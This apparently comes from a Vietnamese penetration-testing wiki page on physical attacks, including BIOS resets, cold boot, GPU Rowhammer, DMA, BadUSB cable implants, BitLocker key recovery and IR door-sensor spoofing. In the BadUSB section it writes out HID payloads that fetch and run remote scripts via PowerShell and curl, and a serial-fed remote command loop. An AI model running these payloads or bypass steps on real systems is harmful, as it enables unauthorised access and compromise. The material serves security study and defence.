# Các cuộc tấn công vật lý

{{#include ../banners/hacktricks-training.md}}

Để khám phá giao diện ở cấp bo mạch, truy cập serial console và flash, cũng như nghiên cứu side channel và glitching, hãy xem [Hardware Hacking](hardware-hacking/README.md) và các chương về từng giao diện. Trang này đề cập đến các cuộc tấn công cần truy cập vật lý vào toàn bộ hệ thống.

## Khôi phục mật khẩu BIOS và bảo mật hệ thống

Có thể đặt lại các thiết lập firmware PC đời cũ bằng cách ngắt kết nối pin CMOS hoặc sử dụng jumper clear-CMOS được tài liệu hóa. Thời gian cần tắt nguồn tùy thuộc vào bo mạch; mật khẩu hoặc khóa UEFI hiện đại có thể được lưu trong flash không mất dữ liệu, embedded controller hoặc thiết bị bảo mật, nên vẫn tồn tại sau khi tháo pin. Hãy xem hướng dẫn sử dụng bo mạch/dịch vụ trước khi nối tắt các chân; quy trình này cũng có thể làm mất hiệu lực các phép đo TPM và kích hoạt quy trình khôi phục mã hóa ổ đĩa.

Trên các hệ thống x86 đời cũ, có thể dùng các công cụ như **killCMOS** và **CmosPwd** để kiểm tra hoặc thay đổi thiết lập được lưu trong CMOS từ môi trường khởi động. CmosPwd nhận diện các định dạng mật khẩu thuộc một tập hợp BIOS đời cũ được tài liệu hóa, đồng thời có thể sao lưu, khôi phục hoặc xóa/kill trạng thái CMOS; các bản dựng được công bố nhắm đến môi trường DOS/Windows đời cũ, Linux, FreeBSD và NetBSD.<sup>[[18]](#references)</sup> Các tiện ích này không phải công cụ xóa mật khẩu UEFI dùng chung và cần quyền truy cập phần cứng/firmware phù hợp.

Một số firmware laptop hiển thị mã thử thách riêng của nhà cung cấp sau một số lần nhập sai mật khẩu. Các cơ sở dữ liệu như [bios-pw.org](https://bios-pw.org) có thể tạo mật khẩu khôi phục đời cũ cho một số mẫu máy, nhưng nhiều hệ thống khóa máy mà không đưa ra mã thử thách có thể suy ra. Hãy xem mọi mật khẩu được tạo là chỉ dành cho mẫu máy cụ thể và tránh làm cạn bộ đếm số lần thử vĩnh viễn.

### Bảo mật UEFI

Đối với các hệ thống **UEFI** hiện đại, CHIPSEC có thể kiểm tra các biện pháp bảo vệ biến Secure Boot. Hãy bắt đầu bằng bước kiểm tra không làm thay đổi hệ thống bên dưới; chế độ `-a modify` tùy chọn cố ý thử làm hỏng các biến và chỉ nên dùng trên hệ thống lab có thể khôi phục. Bản thân CHIPSEC cảnh báo rằng driver có đặc quyền và khả năng truy cập phần cứng cấp thấp của công cụ không phù hợp với các endpoint production.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Phân tích RAM và Cold Boot Attacks

DRAM không mất mọi bit ngay lập tức khi ngừng refresh. Tốc độ suy giảm thay đổi đáng kể tùy công nghệ module và nhiệt độ; làm lạnh có thể bảo toàn dữ liệu hữu ích lâu hơn nhiều so với chu kỳ tắt nguồn không làm lạnh. Cold-boot attack nhanh chóng khởi động lại vào một môi trường thu thập dữ liệu nhỏ hoặc chuyển module đã làm lạnh, chụp bộ nhớ thô rồi tái dựng khóa mật mã bất chấp tình trạng suy giảm bit. Tiện ích sao chép đĩa không tự động là công cụ chụp bộ nhớ vật lý, còn Volatility phân tích dữ liệu đã chụp chứ không thu thập dữ liệu; hãy dùng công cụ thu thập phù hợp với nền tảng và đã được xác thực.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer nhắm vào Page Table

Các cuộc tấn công GPU Rowhammer hiện đại hữu ích hơn nhiều khi nhắm vào **metadata bộ nhớ ảo của GPU** thay vì các buffer thông thường. Nghiên cứu gần đây trên **GPU NVIDIA Ampere GDDR6** cho thấy kẻ tấn công chạy mã CUDA không có đặc quyền có thể tạo các mẫu hammering đặc thù GPU, dùng **memory massaging** để đặt cấu trúc paging vào các hàng dễ bị tấn công, rồi lật bit trong **page table cấp cuối** hoặc **page directory** trung gian. Khi một mục translation bị hỏng, kẻ tấn công có thể tạo nền tảng để đạt được **quyền đọc/ghi bộ nhớ GPU tùy ý**, rồi chuyển hướng sang xâm nhập host.<sup>[[1]](#references)[[2]](#references)</sup>

### Mẫu khai thác

1. **Lập hồ sơ các hàng có thể hammer** trong GDDR6 và tạo các mẫu hammering có tính đến refresh/không đồng nhất để vượt qua các biện pháp giảm thiểu trong DRAM.
2. **Điều chỉnh các cấp phát GPU** để driver đặt cấu trúc page-translation tại các vị trí vật lý có thể hammer thay vì giữ chúng trong pool được bảo vệ mặc định. Trên thực tế, việc này có thể bao gồm làm cạn vùng page-table bộ nhớ thấp và rải các ánh xạ UVM thưa lớn với stride có kiểm soát.
3. **Lật metadata translation** như **PFN** hoặc các bit liên quan đến aperture bên trong mục page-table/page-directory, khiến trang ảo do kẻ tấn công kiểm soát được ánh xạ tới các trang page-table, bộ nhớ GPU tùy ý hoặc các ánh xạ hệ thống hiển thị với host.
4. Dùng lại ánh xạ giả mạo để ghi lại các mục translation khác và nâng cấp thành **quyền đọc/ghi bộ nhớ GPU tùy ý** giữa các GPU context.

### Chuyển hướng sang host và biện pháp giảm thiểu

- Khi **IOMMU bị tắt**, các ánh xạ system-aperture giả mạo có thể làm lộ **bộ nhớ vật lý host** tùy ý cho GPU, biến primitive GPU thành khả năng xâm nhập toàn bộ host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** nhắm vào các mục page-table cấp cuối, trong khi **GeForge** cho thấy làm hỏng cấp page-directory có thể dễ hơn vì chỉ một bit flip cũng có thể chuyển hướng một cây translation lớn hơn. Đừng chỉ xem một lớp paging là quan trọng đối với bảo mật.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** vẫn quan trọng vì nó chặn đường truy cập trực tiếp vào bộ nhớ host tùy ý mà GDDRHammer/GeForge sử dụng, nhưng **không phải biện pháp giảm thiểu toàn diện**. **GPUBreach** cho thấy một bước chuyển hướng thứ hai, trong đó kẻ tấn công làm hỏng các buffer CPU do driver sở hữu và GPU có thể ghi, sau đó kích hoạt lỗi memory-safety trong driver NVIDIA để có primitive ghi kernel và **root shell**, ngay cả khi IOMMU được bật.<sup>[[3]](#references)</sup>
- **ECC cấp hệ thống** là biện pháp tăng cường bảo vệ thiết thực trên các GPU workstation/server được hỗ trợ. GPU phổ thông không có ECC có bề mặt phòng thủ yếu hơn.<sup>[[4]](#references)</sup>
- Những cuộc tấn công này không chỉ là lý thuyết: **GeForge** báo cáo **1,171** bit flip trên RTX 3060 và **202** trên RTX A6000, đủ để xây dựng một chuỗi nâng quyền trên host hoạt động được.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Tấn công Direct Memory Access (DMA)

Để xem cách vá offline UEFI IFR/NVRAM có thể hạ cấp cơ chế thực thi IOMMU trước khi khởi động và bật một chuỗi tấn công DMA trên Windows, hãy xem:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** trình diễn cách thu thập và vá bộ nhớ dựa trên **DMA** qua các giao diện như FireWire và những cấu hình Thunderbolt đời đầu, bao gồm các dấu hiệu bỏ qua đăng nhập từng được ghi nhận trong lịch sử. Không thể đơn giản kết luận rằng kỹ thuật này “không hiệu quả với Windows 10”: khả năng khai thác phụ thuộc vào giao diện, bản dựng mục tiêu, chính sách IOMMU, trạng thái khóa và việc Windows Kernel DMA Protection có được hỗ trợ và bật hay không. Windows 10 phiên bản 1803 trở lên đã giới thiệu Kernel DMA Protection trên các nền tảng tương thích, làm thay đổi đáng kể bề mặt tấn công.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Dùng Live CD/USB để truy cập hệ thống

Trên volume Windows không được mã hóa hoặc đã mở khóa, môi trường offline có thể thay các binary trợ năng như **sethc.exe** hoặc **Utilman.exe** bằng **cmd.exe**, từ đó mở command prompt SYSTEM khi chạy phím tắt tương ứng trên màn hình đăng nhập. Các công cụ như **chntpw** có thể chỉnh sửa dữ liệu tài khoản SAM cục bộ. Những phương pháp này không vượt qua được volume BitLocker đang khóa và có thể làm hỏng thông tin xác thực được bảo vệ bằng DPAPI/EFS; hãy lưu bản sao pháp chứng và bản sao lưu.

**Kon-Boot** là công cụ thương mại bỏ qua xác thực lúc khởi động, dành cho các cấu hình Windows/macOS được hỗ trợ. Khả năng tương thích phụ thuộc vào hệ điều hành, chế độ firmware, Secure Boot và cấu hình mã hóa ổ đĩa; công cụ này không giải mã được volume BitLocker đang khóa.<sup>[[10]](#references)</sup>

---

## Xử lý các tính năng bảo mật của Windows

### Phím tắt khởi động và khôi phục

- **Delete/Supr**, F2, F10 hoặc phím khác tùy nhà sản xuất có thể mở phần thiết lập firmware.
- **F8** chỉ vào các tùy chọn khởi động nâng cao kiểu cũ của Windows trên những cấu hình vẫn bật đường dẫn này; cách vào chế độ khôi phục hiện nay tùy cấu hình.
- Nhấn giữ **Shift** có thể ngăn Windows tự động đăng nhập trên một số cấu hình, dù chính sách/cài đặt registry có thể vô hiệu hóa hành vi đó.<sup>[[17]](#references)</sup>

### Thiết bị BAD USB

Các thiết bị như **USB Rubber Ducky** và bo mạch Teensy có thể được nhận diện như bàn phím HID đáng tin cậy và nhập các phím được định sẵn. Payload ban đầu có đặc quyền và quyền truy cập desktop của phiên đăng nhập hiện tại; các lời nhắc UAC, khóa màn hình, bố cục bàn phím, thời điểm thực thi và chính sách USB của endpoint vẫn là những yếu tố giới hạn.<sup>[[15]](#references)</sup>

Thiết bị ngoại vi lập trình được cũng có thể tấn công các parser kernel của host và phối hợp nhiều thiết bị USB để heap grooming và tiết lộ thông tin:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Để xem trường hợp parser bộ nhớ lưu trữ UAS trên Windows, hãy xem:

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

Quyền quản trị viên hoặc quyền sao lưu có thể tạo shadow copy hoặc lưu các registry hive để thu thập các tệp đang khóa như **SAM** và **SYSTEM**. Đây là kỹ thuật thu thập dữ liệu sau khi xâm nhập, không phải cách vượt qua nâng quyền; cần đối chiếu với các sự kiện `diskshadow`/VSS và xuất registry hive.

## Kỹ thuật cấy ghép BadUSB / HID

### Thiết bị HID Android được kích hoạt bằng NFC

Điện thoại Android đã root chỉ có thể trở thành bàn phím USB lập trình được khi bộ điều khiển USB và kernel hỗ trợ **USB gadget/HID**. Trên các thiết bị tương thích, Kali NetHunter cung cấp các cấu hình gadget thông qua **USB Arsenal**. Một lựa chọn khác là [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), công cụ tạo các chức năng gadget ConfigFS và có thể cung cấp các thiết bị ký tự bàn phím/chuột như `/dev/hidg0` và `/dev/hidg1`. Công cụ này chỉ tạo endpoint gadget; một tiến trình riêng phải ghi các HID report vào đó. Quyền root không thể bù đắp cho kernel thiếu ConfigFS, hỗ trợ HID gadget hoặc USB Device Controller có thể sử dụng.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Có thể kết hợp endpoint này với NFC trên Android làm cơ chế kích hoạt vật lý. Ứng dụng [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) đọc UID của thẻ, chuyển đổi sang biểu diễn mà ứng dụng mong đợi, kiểm tra whitelist cục bộ và gửi chuỗi phím kiểu Rubber Ducky đã cấu hình khi UID khớp. Host được kết nối sẽ nhận đầu vào bàn phím thông thường và không cần phần mềm NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Hãy kiểm tra quá trình nhận diện thiết bị và bố cục bàn phím trong trình soạn thảo văn bản trống trước khi dùng phím tắt hoặc lệnh. Một payload vô hại là:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Các ranh giới tin cậy quan trọng:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist là nhận dạng, không phải xác thực**. UID là thông tin công khai và một số loại token hoặc trình giả lập cho phép sao chép hoặc giả mạo. UID được sao chép sẽ đi theo cùng luồng xử lý như token gốc.
- Module Magisk **NfcScreenOff** vá dịch vụ NFC để dịch vụ hoạt động như thể màn hình đang bật và đã mở khóa. Nếu điện thoại đã kết nối với máy chủ, điều này có thể cho phép kẻ khác kích hoạt payload mà không cần mở khóa điện thoại.
- Mật khẩu, API token và lệnh lưu trong payload là các bí mật có thể khôi phục trên thiết bị đã root hoặc mở khóa bootloader. Nhập mật khẩu qua HID là tự động hóa việc dùng lại mật khẩu, không phải xác thực không mật khẩu.
- HID injection hoạt động với quyền của desktop đang hoạt động và phụ thuộc vào tiêu điểm, thời gian cũng như bố cục bàn phím của máy chủ. Hãy yêu cầu người dùng xác nhận gần thời điểm thực hiện trước khi gửi các hành động nhạy cảm, tránh lưu bí mật đặc quyền trong script và sử dụng trình xác thực challenge-response bằng mật mã để xác thực thực sự.

### Thiết bị cấy ghép ngụy trang thành cáp, quản lý qua Wi-Fi

- Thiết bị cấy ghép dựa trên ESP32-S3 như **Evil Crow Cable Wind** được giấu bên trong cáp USB-A→USB-C hoặc USB-C↔USB-C, chỉ nhận diện dưới dạng bàn phím USB và cung cấp ngăn xếp C2 qua Wi-Fi. Người vận hành chỉ cần cấp nguồn cho cáp từ máy chủ của nạn nhân, tạo hotspot có tên `Evil Crow Cable Wind` với mật khẩu `123456789`, rồi truy cập [http://cable-wind.local/](http://cable-wind.local/) (hoặc địa chỉ DHCP của thiết bị) để vào giao diện HTTP tích hợp.<sup>[[8]](#references)</sup>
- Giao diện trình duyệt có các tab *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* và *Config*. Payload được lưu gắn thẻ theo hệ điều hành, bố cục bàn phím có thể chuyển đổi ngay lập tức và chuỗi VID/PID có thể được thay đổi để giả dạng thiết bị ngoại vi quen thuộc.
- Vì C2 nằm bên trong cáp, điện thoại có thể chuẩn bị payload, kích hoạt thực thi và quản lý thông tin đăng nhập Wi-Fi mà không cần dùng mạng của tổ chức—hữu ích cho các vụ xâm nhập vật lý có thời gian hiện diện ngắn.

### Payload AutoExec nhận diện hệ điều hành

- Quy tắc AutoExec liên kết một hoặc nhiều payload để chạy ngay sau khi USB được nhận diện. Thiết bị cấy ghép thực hiện nhận diện hệ điều hành sơ bộ rồi chọn script phù hợp.
- Quy trình mẫu:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) hoặc `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Vì quá trình thực thi không cần giám sát, chỉ cần đổi cáp sạc là có thể đạt được quyền truy cập ban đầu kiểu “cắm là chiếm quyền” trong ngữ cảnh người dùng đang đăng nhập.

### Remote shell qua Wi-Fi TCP được khởi tạo bằng HID

1. **Khởi tạo bằng keystroke:** Payload được lưu sẽ mở console rồi dán một vòng lặp thực thi bất cứ nội dung nào nhận được qua thiết bị nối tiếp USB mới. Một biến thể Windows tối giản là:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cầu nối cáp:** Implant giữ kênh USB CDC mở trong khi ESP32-S3 khởi chạy một TCP client (Python script, Android APK hoặc tệp thực thi trên máy tính để bàn) kết nối ngược về phía operator. Mọi byte được nhập vào phiên TCP đều được chuyển tiếp vào vòng lặp serial ở trên, cho phép thực thi lệnh từ xa ngay cả trên các host cách ly mạng. Đầu ra bị hạn chế, vì vậy operator thường chạy các lệnh không cần xem kết quả (tạo tài khoản, chuẩn bị thêm công cụ, v.v.).

### Bề mặt cập nhật HTTP OTA

- Giao diện Evil Crow Cable Wind được tài liệu hóa cung cấp endpoint cập nhật firmware không cần xác thực tại `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Nhân viên hiện trường có thể hot-swap các tính năng (ví dụ: flash firmware USB Army Knife) giữa lúc thực hiện nhiệm vụ mà không cần mở cáp, cho phép implant chuyển sang các khả năng mới trong khi vẫn cắm vào host mục tiêu.

## Vượt qua mã hóa BitLocker

Quá trình thu thập dữ liệu pháp chứng được ủy quyền từ một hệ thống đang chạy hoặc mới chạy gần đây có thể chứa khóa chính của volume BitLocker hoặc tài liệu khóa liên quan khi volume đang được mở khóa. Các công cụ thương mại như Elcomsoft Forensic Disk Decryptor và Passware Kit Forensic có thể tìm kiếm trong các memory image, tệp ngủ đông hoặc crash dump được hỗ trợ, nhưng không đảm bảo thành công. Windows hiện đại cũng mã hóa crash dump khi BitLocker được bật; mật khẩu khôi phục 48 chữ số được lưu trữ là một hiện vật khác với khóa volume nằm trong bộ nhớ.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social engineering để thêm khóa khôi phục

Kẻ tấn công thuyết phục được quản trị viên chạy các lệnh quản lý BitLocker có thể thêm một recovery password, external key hoặc protector khác rồi lấy cắp khóa đó. Recovery password không thể là một chuỗi số 0 tùy ý: recovery password dạng số của BitLocker phải tuân theo định dạng 48 chữ số đã được xác thực. Cú pháp quản trị được ủy quyền liên quan là `manage-bde -protectors -add C: -recoverypassword`; liệt kê các protector đã thêm bằng `manage-bde -protectors -get C:`. Theo dõi việc thêm protector và bảo đảm tài liệu khôi phục mới chỉ được lưu trữ an toàn tại các vị trí đã phê duyệt.<sup>[[16]](#references)</sup>

---

## Khai thác công tắc mở khung máy/bảo trì để khôi phục BIOS về cài đặt gốc

Nhiều laptop hiện đại và máy tính để bàn cỡ nhỏ có **công tắc phát hiện mở khung máy** được Embedded Controller (EC) và firmware BIOS/UEFI giám sát. Mặc dù mục đích chính của công tắc là phát cảnh báo khi thiết bị bị mở, đôi khi nhà cung cấp triển khai một **phím tắt khôi phục không được tài liệu hóa**, được kích hoạt khi công tắc được gạt theo một chuỗi thao tác cụ thể.<sup>[[5]](#references)[[6]](#references)</sup>

### Cách thức tấn công

1. Công tắc được nối với một **ngắt GPIO** trên EC.
2. Firmware chạy trên EC theo dõi **thời điểm và số lần nhấn**.
3. Khi nhận diện được một chuỗi thao tác được mã hóa cứng, EC gọi một quy trình *mainboard-reset* để **xóa nội dung NVRAM/CMOS của hệ thống**.
4. Trong lần khởi động tiếp theo, các model bị ảnh hưởng sẽ tải trạng thái firmware đã được đặt lại. Tùy nhà cung cấp và phiên bản, trạng thái bị xóa có thể bao gồm mật khẩu supervisor, cài đặt khởi động tùy chỉnh hoặc các khóa Secure Boot đã đăng ký; cần đánh giá riêng trạng thái TPM và ảnh hưởng đến mã hóa ổ đĩa.

> Việc đặt lại firmware có thể khôi phục tùy chọn khởi động từ thiết bị ngoài, nhưng **không** giải mã dữ liệu lưu trữ. BitLocker hoặc hệ thống mã hóa toàn bộ ổ đĩa khác có thể yêu cầu khôi phục sau khi TPM/firmware thay đổi và vẫn bảo vệ ổ đĩa trong nếu không có khóa khôi phục.<sup>[[16]](#references)</sup>

### Ví dụ thực tế – Laptop Framework 13

Phím tắt khôi phục cho Framework 13 (thế hệ 11/12/13) là:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Sau chu kỳ thứ mười, EC đặt một cờ để yêu cầu BIOS xóa NVRAM ở lần khởi động lại tiếp theo. Toàn bộ quy trình mất khoảng 40 giây và **chỉ cần một chiếc tua vít**.<sup>[[5]](#references)</sup>

### Quy trình khai thác tổng quát

1. Bật nguồn hoặc cho mục tiêu tiếp tục hoạt động sau chế độ ngủ để EC chạy.
2. Tháo nắp đáy để lộ công tắc chống xâm nhập/bảo trì.
3. Thực hiện lại kiểu gạt công tắc đặc thù của nhà sản xuất (tham khảo tài liệu, diễn đàn hoặc reverse-engineer firmware EC).
4. Lắp lại máy và khởi động lại, sau đó kiểm tra những thiết lập firmware và thông tin xác thực nào thực sự đã thay đổi.
5. Nếu được cho phép và có thể khởi động từ thiết bị ngoài, hãy khởi động một live image có kiểm soát. Khi một ổ đĩa bên trong được mở khóa hợp lệ (hoặc chưa từng được mã hóa), môi trường live có thể thu thập thông tin xác thực và dữ liệu hoặc kiểm tra EFI System Partition. Việc sửa phân vùng đó để cài EFI implant có tính duy trì lâu dài và xâm nhập sâu; đồng thời vẫn bị giới hạn bởi Secure Boot, measured boot, cơ chế bảo vệ ghi firmware và giám sát endpoint. Không thể truy cập bộ nhớ đã mã hóa nếu không có khóa hoặc thông tin khôi phục.

### Phát hiện & giảm thiểu

* Ghi nhật ký sự kiện xâm nhập khung máy trong bảng điều khiển quản lý OS và đối chiếu với các lần BIOS bị đặt lại bất thường.
* Dùng **tem niêm phong chống can thiệp** trên ốc/nắp để phát hiện việc mở máy.
* Giữ thiết bị trong **khu vực được kiểm soát về mặt vật lý**; giả định rằng quyền truy cập vật lý đồng nghĩa với việc thiết bị đã bị xâm phạm hoàn toàn.
* Nếu có thể, hãy tắt tính năng “maintenance switch reset” của nhà sản xuất hoặc yêu cầu thêm bước ủy quyền mật mã để đặt lại NVRAM.

---

## Tiêm IR bí mật để qua mặt cảm biến thoát không chạm

### Đặc tính cảm biến
- Các cảm biến “wave-to-exit” phổ thông kết hợp bộ phát LED cận hồng ngoại với mô-đun thu kiểu điều khiển TV, chỉ báo mức logic cao sau khi nhận được nhiều xung (~4–10) ở đúng sóng mang (≈30 kHz).<sup>[[7]](#references)</sup>
- Một tấm chắn bằng nhựa ngăn bộ phát và bộ thu nhìn trực tiếp vào nhau, khiến bộ điều khiển giả định rằng sóng mang được xác thực đến từ phản xạ gần đó, rồi kích hoạt relay để mở chốt cửa.
- Khi bộ điều khiển nhận định có mục tiêu, nó thường thay đổi dạng bao điều chế phát ra; tuy nhiên, bộ thu vẫn chấp nhận mọi chuỗi xung khớp với sóng mang đã lọc.

### Quy trình tấn công
1. **Thu thập dạng phát** – kẹp máy phân tích logic vào các chân bộ điều khiển để ghi lại dạng sóng trước và sau khi phát hiện, được dùng để điều khiển LED IR bên trong.
2. **Chỉ phát lại dạng sóng “sau khi phát hiện”** – tháo/bỏ qua bộ phát có sẵn và điều khiển một LED IR bên ngoài bằng mẫu đã kích hoạt ngay từ đầu. Vì bộ thu chỉ quan tâm đến số xung/tần số, nó coi sóng mang giả mạo là phản xạ thật và kích hoạt đường relay.
3. **Điều tiết thời điểm phát** – phát sóng mang theo các chuỗi xung đã tinh chỉnh (ví dụ: bật vài chục mili giây, rồi tắt trong khoảng thời gian tương tự) để đạt số xung tối thiểu mà không làm bão hòa AGC của bộ thu hoặc logic xử lý nhiễu. Phát liên tục nhanh chóng làm giảm độ nhạy cảm biến và khiến relay không còn kích hoạt.

### Tiêm phản xạ tầm xa
- Thay LED thử nghiệm bằng diode IR công suất cao, bộ điều khiển MOSFET và thấu kính hội tụ giúp kích hoạt ổn định từ khoảng cách ~6 m.
- Kẻ tấn công không cần hướng thẳng vào khẩu độ bộ thu; chiếu tia vào tường bên trong, kệ hoặc khung cửa nhìn thấy qua kính sẽ khiến năng lượng phản xạ đi vào trường nhìn ~30° và mô phỏng cử chỉ vẫy tay ở cự ly gần.
- Vì bộ thu chỉ chờ các phản xạ yếu, một chùm tia ngoài mạnh hơn nhiều vẫn có thể phản xạ qua nhiều bề mặt mà vẫn vượt ngưỡng phát hiện.

### Đèn pin tấn công được ngụy trang

- Nhúng bộ điều khiển vào đèn pin thương mại giúp giấu công cụ ngay trước mắt. Thay LED nhìn thấy được bằng LED IR công suất cao phù hợp với dải tần của bộ thu, thêm ATtiny412 (hoặc loại tương tự) để tạo các chuỗi xung ≈30 kHz, và dùng MOSFET để điều khiển dòng qua LED.
- Thấu kính zoom dạng ống lồng giúp thu hẹp chùm tia để tăng tầm xa/độ chính xác, còn mô-tơ rung do MCU điều khiển cung cấp phản hồi xúc giác để xác nhận điều chế đang hoạt động mà không phát ra ánh sáng nhìn thấy được.
- Chuyển qua lại giữa một số mẫu điều chế đã lưu (tần số sóng mang và dạng bao hơi khác nhau) giúp tăng khả năng tương thích với các dòng cảm biến được bán lại dưới thương hiệu khác, cho phép người thao tác quét các bề mặt phản xạ cho đến khi nghe relay tách một tiếng và cửa mở.

---

## References

- [1] [GDDRHammer: Làm nhiễu mạnh các hàng DRAM — Tấn công Rowhammer xuyên thành phần từ các GPU hiện đại](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Tấn công GDDR để giả mạo bảng trang GPU, vừa vui vừa có lợi](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Tấn công leo thang đặc quyền trên GPU bằng Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Thông báo bảo mật: Rowhammer - Tháng 7 năm 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Nhấn vào đây để chiếm quyền”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Hướng dẫn đặt lại bo mạch chủ](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Đừng chạm! – Qua mặt cảm biến thoát IR không chạm bằng đèn pin IR bí mật”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Cắm, chạy, chiếm quyền: Tấn công bằng Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Tấn công Rowhammer nhằm vào chip NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Tài liệu chính thức và thông tin tương thích của Kon-Boot](https://kon-boot.com/)
- [11] [Tài liệu CHIPSEC - Cơ chế bảo vệ biến Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Để chúng ta không quên: Tấn công khởi động nguội nhằm vào khóa mã hóa](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - thao tác bộ nhớ vật lý qua DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Bảo vệ DMA của kernel](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Tài liệu Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Hướng dẫn thao tác BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Hành vi giữ phím Shift và đăng nhập tự động](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Tài liệu và bản tải xuống CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Tài liệu Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Tài liệu kernel Linux - Trình điều khiển USB HID gadget](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [Công cụ USB Gadget](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Biến điện thoại Android đã root thành thiết bị xác thực NFC và công cụ tự động hóa cho PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
